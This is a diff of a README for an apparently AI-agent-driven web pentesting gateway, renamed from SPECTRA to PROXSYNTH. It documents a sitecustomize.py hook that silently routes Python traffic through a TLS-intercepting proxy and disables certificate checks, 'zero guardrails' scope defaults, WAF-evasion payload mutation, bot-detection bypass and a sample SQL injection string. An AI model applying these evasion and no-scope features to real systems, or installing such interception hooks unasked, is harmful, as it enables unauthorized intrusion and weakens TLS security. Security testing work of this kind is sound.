+| **Python Script Auto-Interception (`sitecustomize.py`)** | ✅ **Automatic** | ❌ Manual config | ❌ Manual config | ❌ Manual config | ❌ Manual config |
+| **Agent Working Memory (Hypothesis Ledger P3)** | ✅ **Built-in** | ❌ No | ❌ No | ❌ No | ❌ No |
+| **LLM Semantic Response Distiller (P1: 90% Savings)** | ✅ **Built-in** | ❌ No | ❌ No | ❌ No | ❌ No |
+| **Autonomous Multi-Protocol OAST Sprayer (P2)** | ✅ **HTTP/DNS/LDAP** | ⚠️ Burp Collaborator | ❌ No | ❌ No | ⚠️ OAST Addon |
+| **Headless DOM Execution Oracle Sandbox (P4)** | ✅ **Playwright Hook** | ❌ No | ❌ No | ❌ No | ❌ No |
+| **Zero Guardrails by Default (Local & Labs Work)** | ✅ **Yes** | ✅ Yes | ✅ Yes | ✅ Yes | ⚠️ Complex rules |
+| **Dual-Track Vulnerability Triage (Confirmed vs Pot)** | ✅ **Automated** | ⚠️ Scanner Tab | ❌ No | ❌ No | ⚠️ Alert Tree |
+| **Human-in-the-Loop Intercept Trap via WebSockets** | ✅ **Yes** | ✅ Yes (GUI) | ✅ Yes (GUI) | ✅ Yes (CLI/Web) | ✅ Yes (GUI) |
+| **CLI Pentest Tool Correlation (`sqlmap`, `nuclei`)** | ✅ **Auto-Tagged** | ⚠️ If proxied | ⚠️ If proxied | ⚠️ If proxied | ⚠️ If proxied |
+| **One-Click Standalone Python PoC Generator** | ✅ **Built-in** | ❌ Extension | ❌ No | ❌ No | ❌ No |
+| **Lightweight Headless Deployment (<50MB RAM idle)** | ✅ **FastAPI+Async** | ❌ Heavy Java JVM | ✅ Rust core | ✅ Python | ❌ Java JVM |
+
+---
+
+## 🐍 Transparent Runtime Auto-Enforcement (`sitecustomize.py`)
+
+When AI agents generate and execute custom scripts (e.g. Python `requests`, `httpx`, `urllib`, `aiohttp`, `curl`, `sqlmap`, `ffuf`, `nuclei`), traffic frequently evades proxies because agents forget to specify `--proxy` or configure SSL certificates.
+
+### How Proxynth Solves the Scripting Gap:
+1. **Zero-Configuration Startup:** Python's `site` module automatically loads [`sitecustomize.py`](file:///d:/PROJECT/01/sitecustomize.py) from the workspace root or `site-packages` on interpreter startup before any script runs.
+2. **Environment Auto-Injection:** Automatically injects:
+   ```bash
+   HTTP_PROXY="http://127.0.0.1:8088"
+   HTTPS_PROXY="http://127.0.0.1:8088"
+   REQUESTS_CA_BUNDLE="./.proxynth_ca/proxynth_ca.crt"
+   SSL_CERT_FILE="./.proxynth_ca/proxynth_ca.crt"
+   CURL_CA_BUNDLE="./.proxynth_ca/proxynth_ca.crt"
+   PYTHONHTTPSVERIFY="0"
+   ```
+3. **TLS MITM Decryption:** The Forward Proxy (`:8088`) generates dynamic host certificates on the fly, decrypts HTTPS CONNECT tunnels, and parses HTTP methods, paths, and bodies.
+4. **Legitimate User-Agent Rotation:** Transparently rotates legitimate desktop browser User-Agents (Chrome, Firefox, Safari, Edge) and Client Hints (`sec-ch-ua`) to bypass bot detection.
+5. **Anti-Self-Loopback:** Proxynth automatically detects requests destined for its own dashboard (`:8000`) or proxy (`:8088`) and bypasses interception to prevent deadlocks.
+
+```python
+# The AI Agent writes and executes this simple script:
+import requests
+
+# Zero custom proxy configuration needed!
+# AUTOMATICALLY routed to :8088, decrypted by TLS MITM, and logged in Proxynth Dashboard!
+res = requests.get("https://target.local/api/vuln?id=1' OR 1=1--")
+print(res.status_code, res.text[:200])
+```
+
+---
+
+## 🚀 Installation & Quick Start
 
 ### 1. Prerequisites
-- **Python:** 3.10, 3.11, 3.12, or newer
+- **Python:** 3.10, 3.11, 3.12, 3.13, or 3.14
 - **Operating System:** Windows 10/11, Linux (Ubuntu/Debian/Kali/Arch), or WSL2
-- **Browsers:** Chromium automation engine (installed automatically via Playwright)
+- **Node/Playwright:** Installed automatically by installer script
 
 ---
 
 ### 2. Automated One-Click Installation (Recommended)
 
-SPECTRA includes automated installers that handle full environment provisioning end-to-end:
-1. **Virtual Environment Setup:** Creates and activates a isolated Python virtual environment (`venv`).
-2. **Dependency Resolution:** Installs all core packages (`fastapi`, `fastmcp`, `httpx`, `cryptography`, `playwright`, etc.).
-3. **Headless Browser Provisioning:** Automatically downloads the Playwright Chromium automation binary.
-4. **TLS MITM Root CA Generation:** Generates the self-signed root certificate authority (`.spectra_ca/spectra_ca.crt` and `spectra_ca.key`) required for transparent HTTPS traffic decryption.
-5. **Runtime Proxy Auto-Enforcement Hook:** Copies `sitecustomize.py` directly into the virtual environment's `site-packages` directory so every standalone Python script executed by AI agents or operators automatically routes through port `8088` and trusts the Spectra CA.
-6. **Workspace Environment (`.env`):** Initializes local `.env` with default ports (`8000`, `8088`), project names, and certificate bundle paths (`REQUESTS_CA_BUNDLE`, `SSL_CERT_FILE`, `CURL_CA_BUNDLE`).
+PROXSYNTH includes automated installers that provision the virtual environment, install dependencies, fetch the Playwright Chromium browser, and generate root CA certificates:
 
 #### 🪟 Windows (CMD or PowerShell):
 ```cmd
@@ -228,152 +392,79 @@ chmod +x install.sh run.sh
 
 ---
 
-### 3. Launching SPECTRA
+### 3. Launching PROXSYNTH
 
-SPECTRA consists of:
-1. **The Core Web Dashboard, API & Forward Proxy Engine** (`backend/app.py` + `backend/forward_proxy.py`)
-2. **The FastMCP Server Engine** (`mcp_server.py` launched by your AI agent)
+| Mode | Command (Windows) | Command (Linux / WSL2) | What It Runs |
+| :--- | :--- | :--- | :--- |
+| **Dashboard Only** | `run.bat` or `run.bat dashboard` | `./run.sh dashboard` | FastAPI Web Dashboard (:8000), Forward Proxy (:8088), DNS OAST (:5354), LDAP OAST (:1390) |
+| **FastMCP Server Only** | `run.bat mcp` | `./run.sh mcp` | Headless FastMCP Stdio Server (for Claude Desktop, Cursor, OpenCode) |
+| **Dual Mode (All)** | `run.bat all` | `./run.sh all` | Launches Web Dashboard in background window and FastMCP Server in foreground |
 
-#### One-Click Launch Options:
-
-| Platform | Launch Dashboard Only | Launch MCP Server (Stdio) | Launch Both (Dashboard + MCP) |
-|---|---|---|---|
-| **Windows (CMD)** | `run.bat` or `run.bat dashboard` | `run.bat mcp` | `run.bat all` |
-| **Windows (PowerShell)** | `.\run.ps1` | `.\run.ps1 -Mode mcp` | `.\run.ps1 -Mode all` |
-| **Linux / WSL2** | `./run.sh` | `./run.sh mcp` | `./run.sh all` |
-
-#### Manual Launch (Default Ports):
-```bash
-# Terminal 1: Start Dashboard & Forward Proxy
-uvicorn backend.app:app --host 127.0.0.1 --port 8000 --reload
-```
 Once started:
 - 🌐 **Web Dashboard:** `http://127.0.0.1:8000`
-- 🎯 **OAST Callback Listener:** `http://127.0.0.1:8000/oast/{token}/*`
-- 🔄 **Built-in Forward Proxy:** `http://127.0.0.1:8088`
-
----
-
-### 4. Running on Custom Ports (e.g., When Port 8000 is Occupied)
-
-If port `8000` is currently used by other services (such as WSL2, Docker containers, or internal APIs), you can run SPECTRA on an alternate port (e.g., `8081`) with zero friction:
-
-#### 🪟 Windows PowerShell:
-```powershell
-$env:SPECTRA_PORT="8081"
-$env:SPECTRA_BACKEND_URL="http://127.0.0.1:8081"
-$env:SPECTRA_PROXY_PORT="8088"
-.\venv\Scripts\python.exe -m uvicorn backend.app:app --host 127.0.0.1 --port 8081 --reload
-```
-
-#### 🐧 Linux / WSL2:
-```bash
-export SPECTRA_PORT=8081
-export SPECTRA_BACKEND_URL="http://127.0.0.1:8081"
-export SPECTRA_PROXY_PORT=8088
-./venv/bin/python -m uvicorn backend.app:app --host 127.0.0.1 --port 8081 --reload
-```
-
-All subsystems (including anti-loopback guards, MCP client sync, and frontend indicators) automatically adapt to the designated ports.
+- 🎯 **OAST HTTP Callback:** `http://127.0.0.1:8000/oast/{token}/*`
+- 🔄 **Forward Interception Proxy:** `http://127.0.0.1:8088`
+- 📡 **OAST DNS Listener:** UDP `0.0.0.0:5354`
+- ⚡ **OAST LDAP/JNDI Listener:** TCP `0.0.0.0:1390`
 
 ---
 
 ## 🤖 AI Agent Integration Guide
 
-SPECTRA integrates seamlessly with all leading autonomous agents. Below are production configurations for the most popular platforms.
+Connect your autonomous agent to PROXSYNTH via standard Model Context Protocol configuration:
 
----
-
-### 1. OpenCode Integration
-
-[OpenCode](https://github.com/opencode-ai) connects to SPECTRA natively via Model Context Protocol configuration.
-
-#### Step 1: Configure OpenCode MCP Settings
-Add SPECTRA to your workspace MCP configuration (`.opencode/mcp.json`) or global settings (`~/.opencode/mcp.json`):
-
-```json
-{
-  "mcpServers": {
-    "spectra": {
-      "command": "d:/PROJECT/01/venv/Scripts/python.exe",
-      "args": [
-        "d:/PROJECT/01/mcp_server.py"
-      ],
-      "env": {
-        "SPECTRA_BACKEND_URL": "http://127.0.0.1:8000",
-        "SPECTRA_PROJECT": "client-alpha",
-        "PYTHONIOENCODING": "utf-8"
-      }
-    }
-  }
-}
-```
-*(On Linux/macOS, point `command` to `venv/bin/python`)*.
-
-#### Step 2: System Instructions for OpenCode
-Add the following directive into your OpenCode instructions (`AGENTS.md` or `.opencode/instructions.md`):
-
-```markdown
-# SPECTRA SECURITY TESTING PROTOCOL
-You are connected to the SPECTRA Security Gateway via MCP tools:
-1. ALWAYS use `send_http_request` for direct HTTP/HTTPS interactions. Use `output_format="json"` for structured responses and `diff_baseline_id` to compare fuzzed variations against baselines.
-2. DO NOT prompt the user for session cookies or login tokens. SPECTRA automatically injects authenticated session credentials into target requests.
-3. When executing terminal utilities or writing custom scripts (Python, curl, sqlmap, ffuf): Even if executed directly in host bash/terminal, SPECTRA's transparent runtime hook (`sitecustomize.py`) and `.env` automatically route all outbound HTTP/HTTPS script traffic through the Built-in Forward Proxy (:8088), decrypt TLS MITM traffic, and log all requests without requiring manual proxy parameters.
-4. Maintain target intelligence using `get_attack_surface` and record discovered assets, ports, and routes via `record_target_asset`, `record_target_service`, and `record_target_endpoint`.
-5. For Blind SSRF, Blind SQLi, or XXE testing, generate callback listeners via `generate_oast_token` and verify hits with `poll_oast_events`.
-6. Catalog exploit strings using `record_test_payload` and immediately flag verified vulnerabilities using `report_vulnerability`.
-```
-
----
-
-### 2. Hermes Agent Integration
-
-[Hermes Agent](https://github.com/hermes-agent) connects via `hermes_config.json`:
-
-```json
-{
-  "mcp": {
-    "servers": {
-      "spectra": {
-        "command": "d:/PROJECT/01/venv/Scripts/python.exe",
-        "args": [
-          "d:/PROJECT/01/mcp_server.py"
-        ],
-        "env": {
-          "SPECTRA_BACKEND_URL": "http://127.0.0.1:8000",
-          "SPECTRA_PROJECT": "default",
-          "PYTHONIOENCODING": "utf-8"
-        }
-      }
-    }
-  }
-}
-```
-
-Launch Hermes with your target prompt:
-```bash
-hermes run --config hermes_config.json --prompt "Perform security reconnaissance against http://target.local and report attack surface."
-```
-
----
-
-### 3. Claude Code & Claude Desktop Integration
-
-Add SPECTRA to your `claude_desktop_config.json`:
+### 1. Claude Desktop & Claude Code
+Add PROXSYNTH to your `claude_desktop_config.json`:
 - **Windows:** `%APPDATA%\Claude\claude_desktop_config.json`
 - **macOS:** `~/Library/Application Support/Claude/claude_desktop_config.json`
 
 ```json
 {
   "mcpServers": {
-    "spectra": {
+    "proxynth": {
       "command": "d:\\PROJECT\\01\\venv\\Scripts\\python.exe",
       "args": [
         "d:\\PROJECT\\01\\mcp_server.py"
       ],
       "env": {
-        "SPECTRA_BACKEND_URL": "http://127.0.0.1:8000",
-        "SPECTRA_PROJECT": "pentest-target"
+        "PROXSYNTH_BACKEND_URL": "http://127.0.0.1:8000",
+        "PROXSYNTH_PROJECT": "default",
+        "PYTHONIOENCODING": "utf-8"
+      }
+    }
+  }
+}
+```
+
+### 2. Cursor IDE
+Add to `.cursor/mcp.json` or Cursor Settings > MCP:
+```json
+{
+  "mcpServers": {
+    "proxynth": {
+      "command": "d:/PROJECT/01/venv/Scripts/python.exe",
+      "args": ["d:/PROJECT/01/mcp_server.py"],
+      "env": {
+        "PROXSYNTH_BACKEND_URL": "http://127.0.0.1:8000",
+        "PROXSYNTH_PROJECT": "default"
+      }
+    }
+  }
+}
+```
+
+### 3. OpenCode & Hermes Agent
+Add to `mcp_config.json` or `opencode.json`:
+```json
+{
+  "mcpServers": {
+    "proxynth": {
+      "command": "d:/PROJECT/01/venv/Scripts/python.exe",
+      "args": ["d:/PROJECT/01/mcp_server.py"],
+      "env": {
+        "PROXSYNTH_BACKEND_URL": "http://127.0.0.1:8000",
+        "PROXSYNTH_PROJECT": "client-alpha",
+        "PYTHONIOENCODING": "utf-8"
       }
     }
   }
@@ -382,694 +473,67 @@ Add SPECTRA to your `claude_desktop_config.json`:
 
 ---
 
-### 4. Cursor / Windsurf / VS Code Roo / Cline
-
-For any editor supporting standard MCP stdio JSON-RPC:
-
-```json
-{
-  "name": "spectra",
-  "command": "d:/PROJECT/01/venv/Scripts/python.exe",
-  "args": ["d:/PROJECT/01/mcp_server.py"],
-  "env": {
-    "SPECTRA_BACKEND_URL": "http://127.0.0.1:8000",
-    "SPECTRA_PROJECT": "default"
-  }
-}
-```
-
----
-
-## 🐍 Transparent Script Execution & Micro-SDK
-
-When agents write custom Python scripts or exploit PoCs, they have three seamless options:
-
-### Option A: Fully Transparent Auto-Enforcement (`sitecustomize.py` & Runtime Hook)
-Whether executed via `run_pentest_command` **OR** run directly in the host terminal/bash (`python exploit.py`, `pytest`, etc.):
-- **Automatic Runtime Injection:** Python automatically executes [`sitecustomize.py`](file:///d:/PROJECT/01/sitecustomize.py) at startup before user code runs.
-- **Environment & Library Patching:** Automatically configures proxy variables (`HTTP_PROXY`, `HTTPS_PROXY`, `ALL_PROXY`), points SSL bundles to `.spectra_ca/spectra_ca.crt`, and transparently routes `requests.Session` and `httpx.Client` / `AsyncClient` calls to the Spectra Forward Proxy (`http://127.0.0.1:8088`).
-- **Loopback Protection:** Automatically bypasses proxying for internal Spectra backend calls (`127.0.0.1:8000`) to avoid recursive loops or deadlocks.
-- **Zero Agent Friction:** The agent or operator does **not** need to pass `--proxy` arguments or configure custom proxies inside their script:
-
-```python
-# OpenCode writes a standard script: exploit_poc.py
-import requests
-
-# Zero custom proxy configuration needed!
-# AUTOMATICALLY routed to :8088 and decrypted by Spectra TLS MITM
-response = requests.get("https://target.local/api/vuln?id=1' OR 1=1--")
-print(response.status_code, response.text[:200])
-```
-
-- Traffic is captured and logged with `source="FORWARD_PROXY"`.
-- Real HTTPS request methods, URL paths, headers, and request/response bodies are fully parsed and displayed.
-- Dual-track vulnerability triage inspects the traffic in real time.
-- Target endpoints and services are automatically registered into the Target Knowledge Graph.
-
----
-
-### Option B: Advanced Micro-SDK (`spectra_client.py`)
-For complex offensive security scripts requiring programmatic finding submission or explicit session control:
-
-```python
-from spectra_client import SpectraSession, report_finding
-
-# Pre-configured session that inherits proxy and backend settings
-with SpectraSession() as session:
-    res = session.get("https://target.local/api/users")
-    if "admin_hash" in res.text:
-        # Programmatically report confirmed finding directly to Spectra Dashboard
-        report_finding(
-            title="Sensitive Hash Disclosure",
-            severity="HIGH",
-            category="Information Disclosure",
-            evidence=res.text[:100],
-            target_url="https://target.local/api/users"
-        )
-```
-
----
-
-### 🔐 Built-in Forward Proxy & TLS MITM Decryption Engine
-
-The Built-in Forward Proxy (`backend/forward_proxy.py`) running on port `8088` (customizable) operates as a full-featured Man-in-the-Middle (MITM) engine:
-
-1. **Dynamic Root CA Authority:** On startup, Spectra generates or loads a persistent self-signed root CA certificate at `.spectra_ca/spectra_ca.crt` and `.spectra_ca/spectra_ca.key`.
-2. **Dynamic Host Certificates:** When a script issues an HTTPS request via `CONNECT target.com:443`, Spectra dynamically creates and signs a TLS certificate for `target.com` on the fly.
-3. **Decryption & Payload Parsing:** The proxy completes the TLS handshake with the client, un-wraps the encrypted payload, and parses the raw HTTP method, headers, query parameters, and POST/PUT request body.
-4. **Outbound Forwarding & Chaining:** The proxy securely establishes an outbound TLS connection to the actual target server (or chains to an upstream proxy like Burp Suite or OWASP ZAP if configured).
-5. **Full Response Telemetry:** Target response status codes, headers, and bodies are decrypted, checked against automated vulnerability signatures, and transmitted via WebSocket to the live dashboard.
-6. **Elimination of Tunnel Noise:** Raw `CONNECT` tunnel establishment requests are suppressed from the primary traffic ledger, ensuring the operator and AI agent only see clean, actionable HTTP/HTTPS transactions and findings.
-
----
-
-## 📖 Complete Usage Tutorial & Workflow
-
-```
-┌────────────────────────────────────────────────────────────────────────────────────────────────────────┐
-│                                     SPECTRA PENTESTING LIFECYCLE                                       │
-│                                                                                                        │
-│  [1. Scope & Rules] ──> [2. Auth Ingestion] ──> [3. Attack Surface Recon] ──> [4. Autonomous Testing] │
-│                                                                                       │                │
-│  [8. Report Export] <── [7. Human Verification] <── [6. OAST Callback Verification] <─┘                │
-└────────────────────────────────────────────────────────────────────────────────────────────────────────┘
-```
-
----
-
-### Phase 1: Target Scope & Guardrail Setup (Zero Default Guardrails)
-1. **Unrestricted Out-of-the-Box:** By default, every project is created with **Zero Guardrails Active** (`scope_enabled = False`, `allow_internal_networks = True`, `allowed_hosts = ["*"]`, `blocked_patterns = []`). Testing against local environments (`127.0.0.1`), RFC1918 private subnets, and external domains works immediately without blocking.
-2. **Optional Manual Hardening:** If your assessment requires strict boundaries to prevent the AI Agent from wandering out of scope or hitting destructive endpoints, navigate to the **Scope Guardrails** tab:
-   - **Enforce Scope Guardrail:** Toggle to `ENABLED` to activate policy checks.
-   - **Allowed In-Scope Targets:** Configure authorized domains (e.g., `*.target-app.local`, `api.vulnweb.com`). Wildcard `*` permits all hosts.
-   - **SSRF Protection:** Toggle `Permit Private RFC1918 Subnets` if internal target scanning is desired.
-   - **Blocked Sensitive Routes:** Add regex patterns to protect critical routes from automated fuzzing (e.g., `logout`, `delete.*user`, `payment`).
-   - **Upstream Proxy Chaining:** Forward traffic to an upstream proxy listener like Burp Suite or OWASP ZAP (e.g., `http://127.0.0.1:8080`).
-   - **Anti-Self-Loopback:** Spectra automatically prevents recursive loops to its own proxy (`8088`) and backend (`8000`) ports.
-
----
-
-### Phase 2: Credential Ingestion & Zero-Prompt Auto-Injection
-Authenticate the target application once; SPECTRA handles all subsequent session management.
-
-#### Method A: Direct Paste via Session Manager Modal
-1. Click **Session & Cookies** in the top navigation.
-2. Enter the target domain (e.g., `target-app.local`).
-3. Paste credentials in **any** format:
-   - **Raw Cookie String:** `PHPSESSID=da4b9237bac; role=tester`
-   - **cURL Command:** `curl 'http://target/api' -H 'Cookie: auth=xyz'`
-   - **JSON Dump:** `[{"name": "session", "value": "abc"}]`
-4. Click **Import & Store Session**.
-
-#### Method B: Interactive Browser Login (HITL Authentication)
-If the target features CAPTCHA, Cloudflare, or Multi-Factor Authentication (2FA):
-1. Instruct the agent or call `request_manual_login`:
-   ```json
-   {"login_url": "https://target-app.local/login", "domain": "target-app.local"}
-   ```
-2. A visible Chromium browser launches on your screen.
-3. Solve the challenge or submit 2FA tokens.
-4. Click **"I'm Done Logging In — Save Session"** in the top header.
-5. All future requests made by the agent automatically receive these authenticated session tokens.
-
----
-
-### Phase 3: Attack Surface Mapping & Target Knowledge Graph
-Navigate to the **Attack Surface** tab to monitor discovered architecture:
-1. **Asset Topology:** Real-time inventory of active hosts, IP addresses, and operating systems.
-2. **Service Mapping:** Open ports, protocols, and service banners.
-3. **Endpoint Ledger:** Comprehensive route catalog with testing states:
-   - 🔘 `UNTESTED` — Discovered route awaiting assessment.
-   - 🟡 `IN_PROGRESS` — Currently under active testing by the agent.
-   - 🟢 `TESTED_CLEAN` — Thoroughly fuzzed with no vulnerabilities detected.
-   - 🔴 `TESTED_VULNERABLE` — Confirmed vulnerability identified.
-4. Outbound script traffic captured via the Forward Proxy is automatically ingested into the graph.
-
----
-
-### Phase 4: Autonomous Testing & Script Interception
-As the AI Agent conducts security testing:
-1. **Direct HTTP Requests:** `send_http_request` dispatches scoped requests with automatic triage and latency profiling.
-2. **Subprocess Script Execution:** Custom Python scripts, `curl`, and `sqlmap` commands run via `run_pentest_command` are automatically proxied through `:8088`.
-3. **Live Proxy Traffic Table:** Displays real-time transactions with resizable columns, per-column text/regex filters, and status badges.
-4. **Deep Inspector Panel:** Click any request row to view complete headers, formatted JSON/XML bodies, vulnerability evidence, and the agent's stated testing hypothesis.
-
----
-
-### Phase 5: Out-of-Band (OAST) Blind Vulnerability Verification
-Navigate to the **OAST** tab to catch blind exploits:
-1. Agent generates a unique tracking token via `generate_oast_token(vuln_type="SSRF")`.
-2. Agent injects the callback URL (`http://127.0.0.1:8000/oast/<token>/payload`) into asynchronous webhooks, XML entities, or header parameters.
-3. When the vulnerable target communicates back, SPECTRA intercepts the HTTP callback, logs client IP and exfiltrated data, and fires a real-time WebSocket `OAST_HIT` alert.
-4. Agent verifies the callback via `poll_oast_events` with zero human delay.
-
----
-
-### Phase 6: Human-in-the-Loop (HITL) Intercept Trap
-Simulate Burp Suite's Intercept proxy directly within SPECTRA:
-1. Toggle the **INTERCEPT** button to **ON** in the dashboard header.
-2. When the AI agent initiates a high-risk request, execution is paused in memory.
-3. Open the **Intercept Inspector**:
-   - Inspect target parameters, headers, and the agent's reasoning.
-   - **Modify on the Fly:** Tweak SQLi strings, headers, or body data.
-   - **Forward:** Sends the verified request to the target server.
-   - **Drop:** Aborts the request immediately and returns a rejection notice to the agent.
-
----
-
-### Phase 7: Verification via Repeater & Parameter Fuzzer
-1. **Repeater Console:** Clone any captured log entry or Payload Vault string into the Repeater workbench for manual replay.
-2. **Baseline Differential Analysis:** Highlights byte length deltas and status transitions between original responses and modified replays.
-3. **Parameter Fuzzer:** Launch focused dictionary attacks (SQLi, XSS Polyglots, LFI, SSTI, OS Injection) against target parameters with configurable concurrency threads.
-
----
-
-### Phase 8: Exporting Reports & Industry Deliverables
-Click **Export & Reports** in the header to generate enterprise deliverables:
-1. **HAR 1.2 Export:** Download complete `spectra_export_<project>.har` for import into **Burp Suite** (`Project > Import > HAR`), **OWASP ZAP**, or **Postman**.
-2. **Executive Pentest Report (Markdown):** Formatted report with executive summary, scope boundaries, vulnerability ledger, severity ratings, evidence snippets, and remediation guidelines.
-3. **OpenAPI 3.0 Specification:** Auto-generated Swagger/OpenAPI 3.0 YAML/JSON specification reverse-engineered from all observed HTTP traffic.
-
----
-
-## 🧰 Complete MCP Tools Reference Specification
-
-The SPECTRA FastMCP server (`mcp_server.py`) exposes **28 specialized offensive security tools**:
-
----
-
-### 1. `send_http_request`
-Executes an HTTP request through the gateway, auto-injects target session cookies, validates scope, triggers intercept traps if enabled, logs traffic, and runs automated vulnerability triage.
-
-```python
-async def send_http_request(
-    method: str,
-    url: str,
-    headers: Optional[Dict[str, str]] = None,
-    body: Optional[str] = None,
-    project: Optional[str] = None,
-    agent_id: Optional[str] = "primary_agent",
-    reasoning: Optional[str] = None,
-    output_format: Optional[str] = "text",
-    diff_baseline_id: Optional[int] = None,
-    finding_title: Optional[str] = None,
-    finding_severity: Optional[str] = None,
-    finding_category: Optional[str] = None,
-    finding_evidence: Optional[str] = None,
-    flag_status: Optional[str] = None
-) -> str
-```
-
-**Key Parameters:**
-- `output_format`: Set to `"json"` for structured machine-readable responses.
-- `diff_baseline_id`: Pass an earlier Log ID to receive a unified diff, saving up to 90% in token consumption.
-- `finding_*`: Inline vulnerability reporting parameters.
-
----
-
-### 2. `run_pentest_command`
-Executes terminal/CLI commands, automatically routes outbound HTTP/HTTPS traffic through the Built-in Forward Proxy (:8088), enforces CLI Safe-Mode, and records stdout/stderr.
-
-```python
-async def run_pentest_command(
-    command: str,
-    reasoning: Optional[str] = None,
-    tool_name: Optional[str] = "terminal",
-    project: Optional[str] = None,
-    agent_id: Optional[str] = "primary_agent",
-    timeout: Optional[int] = 60,
-    cwd: Optional[str] = None,
-    output_format: Optional[str] = "text"
-) -> str
-```
-
----
-
-### 3. `get_attack_surface`
-Retrieves the current Target Knowledge Graph for the project, returning discovered assets, open services, and endpoints with their testing status.
-
-```python
-async def get_attack_surface(project: Optional[str] = None) -> str
-```
-
----
-
-### 4. `record_target_asset`
-Upserts a target asset (hostname or IP address) into the Target Knowledge Graph.
-
-```python
-async def record_target_asset(
-    host: str,
-    ip: Optional[str] = None,
-    os_info: Optional[str] = None,
-    tags: Optional[List[str]] = None,
-    notes: Optional[str] = None,
-    project: Optional[str] = None
-) -> str
-```
-
----
-
-### 5. `record_target_service`
-Records an open network port and service banner for an asset.
-
-```python
-async def record_target_service(
-    host: str,
-    port: int,
-    protocol: Optional[str] = "tcp",
-    service_name: Optional[str] = None,
-    banner: Optional[str] = None,
-    state: Optional[str] = "open",
-    project: Optional[str] = None
-) -> str
-```
-
----
-
-### 6. `record_target_endpoint`
-Registers an HTTP endpoint in the Knowledge Graph and updates its security testing status (`UNTESTED`, `IN_PROGRESS`, `TESTED_CLEAN`, `TESTED_VULNERABLE`).
-
-```python
-async def record_target_endpoint(
-    host: str,
-    url: str,
-    method: Optional[str] = "GET",
-    parameters: Optional[List[str]] = None,
-    auth_required: Optional[bool] = False,
-    tested_status: Optional[str] = "UNTESTED",
-    notes: Optional[str] = None,
-    project: Optional[str] = None
-) -> str
-```
-
----
-
-### 7. `generate_oast_token`
-Generates a unique Out-of-Band (OAST) tracking token and callback URL for detecting blind vulnerabilities (SSRF, XXE, Blind SQLi, JNDI).
-
-```python
-async def generate_oast_token(
-    vuln_type: Optional[str] = "SSRF",
-    description: Optional[str] = None,
-    project: Optional[str] = None
-) -> str
-```
-
----
-
-### 8. `poll_oast_events`
-Polls for asynchronous callback hits associated with an OAST tracking token.
-
-```python
-async def poll_oast_events(
-    token: str,
-    timeout_seconds: Optional[int] = 5,
-    project: Optional[str] = None
-) -> str
-```
-
----
-
-### 9. `record_test_payload`
-Catalogs a specialized exploit string into the Payload Vault for review and 1-click Repeater replay.
-
-```python
-async def record_test_payload(
-    target_url: str,
-    vuln_type: str,
-    raw_payload: str,
-    target_param: Optional[str] = "",
-    mutation_type: Optional[str] = "DIRECT",
-    outcome: Optional[str] = "TESTED",
-    http_method: Optional[str] = "GET",
-    response_signature: Optional[str] = "",
-    http_status: Optional[int] = None,
-    reasoning: Optional[str] = None,
-    project: Optional[str] = None,
-    agent_id: Optional[str] = "primary_agent"
-) -> str
-```
-
----
-
-### 10. `report_vulnerability`
-Explicitly records a confirmed vulnerability finding in the Spectra Findings Ledger.
-
-```python
-async def report_vulnerability(
-    log_id: int,
-    title: str,
-    severity: str = "HIGH",
-    category: str = "General",
-    evidence: str = "",
-    description: str = "",
-    remediation: str = "",
-    project: str = "default"
-) -> str
-```
-
----
-
-### 11. `get_log_detail`
-Retrieves complete, un-truncated request/response headers, full body, and triage findings for a specific Log ID.
-
-```python
-async def get_log_detail(log_id: int) -> str
-```
-
----
-
-### 12. `get_traffic_history`
-Returns a compact summary list of recent HTTP traffic for review, chaining, or replay.
-
-```python
-async def get_traffic_history(
-    project: Optional[str] = None,
-    limit: Optional[int] = 20
-) -> str
-```
-
----
-
-### 13. `browser_navigate_and_render` *(alias: `render_webpage`)*
-Renders dynamic single-page applications headlessly using Playwright Chromium, extracts the visible DOM, executes optional user actions, and captures background AJAX traffic.
-
-```python
-async def browser_navigate_and_render(
-    url: str,
-    click_selector: Optional[str] = None,
-    fill_inputs: Optional[Dict[str, str]] = None,
-    project: Optional[str] = None,
-    agent_id: Optional[str] = "primary_agent",
-    reasoning: Optional[str] = None
-) -> str
-```
-
----
-
-### 14. `request_manual_login`
-Launches an interactive headed Chromium browser for human authentication (solving CAPTCHA or 2FA). Synchronizes session cookies back into the gateway upon completion.
-
-```python
-async def request_manual_login(
-    login_url: str,
-    domain: str,
-    project: Optional[str] = None
-) -> str
-```
-
----
-
-### 15. `set_identity_session`
-Registers an authenticated session tagged with a specific identity role (e.g. `'attacker'`, `'victim'`, `'admin'`, `'guest'`) to enable Spectra's Autonomous BOLA/IDOR Shadow Matrix.
-
-```python
-async def set_identity_session(
-    domain: str,
-    identity_role: str = "attacker",
-    raw_cookies: str = "",
-    project: str = "default"
-) -> str
-```
-
----
-
-### 16. `test_bola_idor`
-Executes an on-demand BOLA/IDOR shadow test on a specific logged endpoint (by Log ID), replaying with secondary identities to verify unauthorized object-level access.
-
-```python
-async def test_bola_idor(
-    log_id: int,
-    project: str = "default"
-) -> str
-```
-
----
-
-### 17. `mutate_payload`
-Generates evasive, obfuscated variations of an exploit payload (SQLi, XSS, Path Traversal) with header spoofing sets to bypass modern Web Application Firewalls (Cloudflare, AWS WAF, Akamai, ModSecurity).
-
-```python
-async def mutate_payload(
-    raw_payload: str,
-    vuln_type: str = "SQLI",
-    strategy: str = "ALL"
-) -> str
-```
-
----
-
-### 18. `analyze_waf_response`
-Fingerprints active WAF vendor signatures from response status, headers, and body patterns. Returns detected vendors and targeted bypass tactics.
-
-```python
-async def analyze_waf_response(
-    status_code: int,
-    headers: Dict[str, Any],
-    body: str = ""
-) -> str
-```
-
----
-
-### 19. `infer_hidden_endpoints`
-Analyzes observed REST architectural patterns on the target host and predicts hidden, unmapped attack surface routes (CRUD mutations, API documentation, debug actuators, admin consoles, and version probes).
-
-```python
-async def infer_hidden_endpoints(
-    host: str,
-    project: str = "default",
-    auto_register_to_graph: bool = True
-) -> str
-```
-
----
-
-### 20. `get_attack_paths`
-Synthesizes an interconnected attack path graph linking `External Entry -> Exposed Asset -> Target Route -> Vulnerability -> Crown Jewels`, returning structured kill chains and Mermaid diagram representation.
-
-```python
-async def get_attack_paths(
-    project: str = "default"
-) -> str
-```
-
----
-
-### 21. `generate_exploit_poc`
-Generates a standalone, zero-dependency Python exploit script, reproducible cURL command, HTML PoC, and complete CVSS 3.1/4.0 & CWE remediation dossier for a verified finding.
-
-```python
-async def generate_exploit_poc(
-    finding_id: int
-) -> str
-```
-
----
-
-### 22. `send_websocket_message`
